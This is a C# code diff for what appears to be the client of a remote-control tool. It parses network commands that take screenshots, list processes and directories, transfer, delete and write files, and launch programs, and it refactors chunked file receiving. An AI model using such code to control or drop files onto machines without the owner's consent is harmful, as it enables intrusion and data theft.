@@ -17,13 +17,11 @@
 
         private const int DIRECTORY_INTERVAL = 5;
         private const int TASKS_INTERVAL = 5;
-        private const int INTERVAL_SEND_FILE = 1000;
-
-        // In characteres
-        private const int MAX_BUFFER_CACHE_LENGTH = 500;
+        private const int INTERVAL_SEND_FILE = 500;
 
         private static string previousDirectory = string.Empty;
-        private string _fileBuffer = string.Empty;
+        private string _filePathInternal = string.Empty;
+        private long _fileSize = 0;
 
         public Command(Connection connection)
         {
@@ -81,7 +79,7 @@
         {
             try
             {
-                if (commandReceived.Contains("ssr"))
+                if (commandReceived.StartsWith("ssr"))
                 {
                     var screenBuffer = _screenShot.FullScreenshot().GetBuffer();
                     var sizeScreen = screenBuffer.Length;
@@ -92,7 +90,7 @@
                     return;
                 }
 
-                if (commandReceived.Contains("lis"))
+                if (commandReceived.StartsWith("lis"))
                 {
                     var processlist = Process.GetProcesses();
 
@@ -124,7 +122,7 @@
                     return;
                 }
 
-                if (commandReceived.Contains("diz"))
+                if (commandReceived.StartsWith("diz"))
                 {
                     var directoryName = commandReceived.Contains("\\") ?
                         commandReceived.TrimStart(new char[] { 'd', 'i', 'z' }) : Regex.Split(commandReceived, "diz")[1];
@@ -199,7 +197,7 @@
                     return;
                 }
 
-                if (commandReceived.Contains("trx"))
+                if (commandReceived.StartsWith("trx"))
                 {
                     var fileName = Regex.Split(commandReceived, "trx")[1];
 
@@ -228,7 +226,7 @@
                     return;
                 }
 
-                if (commandReceived.Contains("del"))
+                if (commandReceived.StartsWith("del"))
                 {
                     var path = Regex.Split(commandReceived, "del")[1];
 
@@ -241,7 +239,7 @@
                     return;
                 }
 
-                if (commandReceived.Contains("ope"))
+                if (commandReceived.StartsWith("ope"))
                 {
                     var path = Regex.Split(commandReceived, "ope")[1];
 
@@ -252,52 +250,6 @@
 
                         Process.Start(pi);
                     }
-
-                    return;
-                }
-
-                // TODO: Fix it
-                if (commandReceived.StartsWith("fil"))
-                {
-                    var fileInfo = Regex.Split(commandReceived, "fil")[1];
-                    var dataExtension = fileInfo.Contains("*")
-                        ? fileInfo.Split('*') : default(string[]);
-
-                    // Error in command
-                    if (dataExtension == null)
-                    {
-                        return;
-                    }
-
-                    var dataSplitted = dataExtension[1].Contains("+")
-                        ? dataExtension[1].Split('+') : default(string[]);
-
-                    // Error in command
-                    if (dataSplitted == null)
-                    {
-                        return;
-                    }
-
-                    // TODO: Change it for TryParse and in case of error, return and exit from this function
-                    long fileSize = long.Parse(dataSplitted[0]);
-
-                    var extension = dataExtension[0];
-                    var filePath = string.Format("{0}.{1}", dataSplitted[1], extension);
-
-                    // TODO: Review this function in order to test that everything works as expected
-                    _connection?.ReceiveInformationForPath((fileBuffer) =>
-                    {
-                        if (File.Exists(filePath))
-                        {
-                            File.Delete(filePath);
-                        }
-
-                        using (var streamWriter = new StreamWriter(filePath))
-                        {
-                            streamWriter.Write(fileBuffer);
-                            streamWriter.Close();
-                        }
-                    });
 
                     return;
                 }
@@ -324,7 +276,14 @@
                     return;
                 }
 
-                _fileBuffer = _fileBuffer.Length < MAX_BUFFER_CACHE_LENGTH ? commandReceived : string.Empty;
+                if (commandReceived.StartsWith("fil"))
+                {
+                    ProcessFile(commandReceived);
+
+                    return;
+                }
+
+                ProcessFile(commandReceived, true);
             }
             catch (Exception ex)
             {
@@ -336,8 +295,100 @@
 
                 throw ex;
             }
+        }
 
-            Console.WriteLine(commandReceived);
+        public void ProcessFile(string bufferFile, bool isWrite = false)
+        {
+            try
+            {
+                if (!isWrite)
+                {
+                    var fileInfo = Regex.Split(bufferFile, "fil")[1];
+                    var dataExtension = fileInfo.Contains("*")
+                        ? fileInfo.Split('*') : default(string[]);
+
+                    // Error in command
+                    if (dataExtension == null)
+                    {
+                        return;
+                    }
+
+                    var dataSplitted = dataExtension[1].Contains("+")
+                        ? dataExtension[1].Split('+') : default(string[]);
+
+                    // Error in command
+                    if (dataSplitted == null)
+                    {
+                        return;
+                    }
+
+                    // TODO: Change it for TryParse and in case of error, return and exit from this function
+                    long fileSize = long.Parse(dataSplitted[0]);
+
+                    var extension = dataExtension[0];
+                    var filePath = string.Empty;
+                    var fileBuffer = string.Empty;
+
+                    var fileSplitted = default(string[]);
+
+                    if (dataExtension[1].Contains("+") && dataExtension[1].Contains("|"))
+                    {
+                        fileSplitted = dataExtension[1].Split('+')[1].Split('|');
+
+                        filePath = string.Format("{0}.{1}", fileSplitted[0], extension);
+                        fileBuffer = fileSplitted[1];
+                    }
+
+                    if (string.IsNullOrEmpty(filePath))
+                    {
+                        _connection?.SendData("Error receiving the file.");
+
+                        return;
+                    }
+
+                    _filePathInternal = filePath;
+                    _fileSize = fileSize;
+                    var isAppend = (fileBuffer.Length >= fileSize);
+
+                    // Check for append/create
+                    using (var fileWriter = new StreamWriter(filePath, isAppend))
+                    {
+                        fileWriter.Write(fileBuffer);
+                        fileWriter.Close();
+
+                        _connection?.SendData("Receiving file.");
+                    }
+                }
+                else
+                {
+                    if (string.IsNullOrEmpty(_filePathInternal))
+                    {
+                        return;
+                    }
+
+                    // Check for append/create
+                    using (var fileWriter = new StreamWriter(_filePathInternal, true))
+                    {
+                        fileWriter.Write(bufferFile);
+                        fileWriter.Close();
+                    }
+
+                    // Check for file transfer being completed
+                    if (new FileInfo(_filePathInternal).Length >= _fileSize)
+                    {
+                        _connection?.SendData("File received successfully.");
+
+                        _filePathInternal = string.Empty;
+                        _fileSize = 0;
+                    }
+                }
+
+                return;
+            }
+            catch (Exception ex)
+            {
+                throw ex;
+            }
         }
     }
 }
